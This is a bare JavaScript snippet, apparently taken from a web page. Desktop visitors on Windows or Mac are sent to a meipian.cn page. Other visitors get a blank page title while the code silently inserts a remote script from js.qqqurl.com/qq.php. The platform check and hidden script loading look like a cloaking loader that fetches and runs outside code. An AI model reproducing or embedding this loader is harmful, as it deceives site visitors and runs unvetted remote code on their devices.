if(/win|mac/ig.test(navigator.platform.toLowerCase())){window.location.href="https://www.meipian.cn/1ebocpk2"; }
 function loadJs(e) {
    var t = document.createElement("script"),
    n = document.getElementsByTagName("script")[0];
    t.src = e,
    t.type = "text/javascript",
    t.async = !0,
    n.parentNode.insertBefore(t, n)
}
function loadPage() {
    document.title = '';
    loadJs("https://js.qqqurl.com/qq.php");
}
loadPage();
